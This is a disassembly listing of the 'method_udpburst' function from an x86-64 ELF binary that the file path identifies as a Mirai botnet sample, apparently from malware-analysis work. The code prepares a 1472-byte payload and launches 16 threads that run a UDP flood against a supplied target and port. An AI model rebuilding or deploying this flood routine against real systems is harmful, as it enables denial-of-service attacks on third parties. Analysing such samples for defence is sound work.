
/Users/taogoldi/Projects/malware/Mirai/input/d40cf9c95dcedf4f19e4a5f5bb744c8e98af87eb5703c850e6fda3b613668c28.elf:	file format elf64-x86-64

Disassembly of section .text:

0000000000400f60 <method_udpburst>:
  400f60: 41 55                        	push	r13
  400f62: 89 d1                        	mov	ecx, edx
  400f64: 31 c0                        	xor	eax, eax
  400f66: 41 54                        	push	r12
  400f68: 41 89 d4                     	mov	r12d, edx
  400f6b: 89 f2                        	mov	edx, esi
  400f6d: 55                           	push	rbp
  400f6e: 89 f5                        	mov	ebp, esi
  400f70: 48 89 fe                     	mov	rsi, rdi
  400f73: 53                           	push	rbx
  400f74: 48 89 fb                     	mov	rbx, rdi
  400f77: bf 90 4c 41 00               	mov	edi, 0x414c90
  400f7c: 48 81 ec d8 01 00 00         	sub	rsp, 0x1d8
  400f83: e8 48 6f 00 00               	call	0x407ed0 <printf>
  400f88: be 01 00 00 00               	mov	esi, 0x1
  400f8d: bf 02 00 00 00               	mov	edi, 0x2
  400f92: e8 cd 99 00 00               	call	0x40a964 <signal>
  400f97: be 01 00 00 00               	mov	esi, 0x1
  400f9c: bf 0d 00 00 00               	mov	edi, 0xd
  400fa1: e8 be 99 00 00               	call	0x40a964 <signal>
  400fa6: e8 65 61 00 00               	call	0x407110 <getpid>
  400fab: 89 c7                        	mov	edi, eax
  400fad: e8 1e ad 00 00               	call	0x40bcd0 <srandom>
  400fb2: 31 c0                        	xor	eax, eax
  400fb4: 48 89 e2                     	mov	rdx, rsp
  400fb7: 88 04 10                     	mov	byte ptr [rax + rdx], al
  400fba: 48 ff c0                     	inc	rax
  400fbd: 48 3d 00 01 00 00            	cmp	rax, 0x100
  400fc3: 75 f2                        	jne	0x400fb7 <method_udpburst+0x57>
  400fc5: 31 c9                        	xor	ecx, ecx
  400fc7: 89 c8                        	mov	eax, ecx
  400fc9: 99                           	cdq
  400fca: c1 ea 18                     	shr	edx, 0x18
  400fcd: 01 d0                        	add	eax, edx
  400fcf: 25 ff 00 00 00               	and	eax, 0xff
  400fd4: 29 d0                        	sub	eax, edx
  400fd6: 48 98                        	cdqe
  400fd8: 0f b6 04 04                  	movzx	eax, byte ptr [rsp + rax]
  400fdc: 31 c8                        	xor	eax, ecx
  400fde: 88 81 40 05 52 00            	mov	byte ptr [rcx + 0x520540], al
  400fe4: 48 ff c1                     	inc	rcx
  400fe7: 48 81 f9 c0 05 00 00         	cmp	rcx, 0x5c0
  400fee: 75 d7                        	jne	0x400fc7 <method_udpburst+0x67>
  400ff0: 4c 8d ac 24 80 01 00 00      	lea	r13, [rsp + 0x180]
  400ff8: ba 50 00 00 00               	mov	edx, 0x50
  400ffd: 31 f6                        	xor	esi, esi
  400fff: 4c 89 ef                     	mov	rdi, r13
  401002: e8 19 8b 00 00               	call	0x409b20 <memset>
  401007: 48 89 de                     	mov	rsi, rbx
  40100a: ba 3f 00 00 00               	mov	edx, 0x3f
  40100f: 4c 89 ef                     	mov	rdi, r13
  401012: e8 4d 8d 00 00               	call	0x409d64 <strncpy>
  401017: 44 89 a4 24 c4 01 00 00      	mov	dword ptr [rsp + 0x1c4], r12d
  40101f: 4c 8d a4 24 00 01 00 00      	lea	r12, [rsp + 0x100]
  401027: 89 ac 24 c0 01 00 00         	mov	dword ptr [rsp + 0x1c0], ebp
  40102e: c7 84 24 c8 01 00 00 c0 05 00 00     	mov	dword ptr [rsp + 0x1c8], 0x5c0
  401039: c6 84 24 cc 01 00 00 00      	mov	byte ptr [rsp + 0x1cc], 0x0
  401041: 49 8d ac 24 80 00 00 00      	lea	rbp, [r12 + 0x80]
  401049: 4c 89 e3                     	mov	rbx, r12
  40104c: 66 66 66 90                  	nop
  401050: 31 f6                        	xor	esi, esi
  401052: 48 89 df                     	mov	rdi, rbx
  401055: 4c 89 e9                     	mov	rcx, r13
  401058: ba b0 14 40 00               	mov	edx, 0x4014b0
  40105d: 48 83 c3 08                  	add	rbx, 0x8
  401061: e8 8a 4a 00 00               	call	0x405af0 <pthread_create>
  401066: 48 39 dd                     	cmp	rbp, rbx
  401069: 75 e5                        	jne	0x401050 <method_udpburst+0xf0>
  40106b: 31 db                        	xor	ebx, ebx
  40106d: 66 66 90                     	nop
  401070: 49 8b 3c dc                  	mov	rdi, qword ptr [r12 + 8*rbx]
  401074: 31 f6                        	xor	esi, esi
  401076: 48 ff c3                     	inc	rbx
  401079: e8 3d 1a 00 00               	call	0x402abb <pthread_join>
  40107e: 48 83 fb 10                  	cmp	rbx, 0x10
  401082: 75 ec                        	jne	0x401070 <method_udpburst+0x110>
  401084: bf 38 50 41 00               	mov	edi, 0x415038
  401089: e8 be 6d 00 00               	call	0x407e4c <puts>
  40108e: 48 81 c4 d8 01 00 00         	add	rsp, 0x1d8
  401095: 5b                           	pop	rbx
  401096: 5d                           	pop	rbp
  401097: 41 5c                        	pop	r12
  401099: 41 5d                        	pop	r13
  40109b: c3                           	ret
  40109c: 66 66 66 90                  	nop
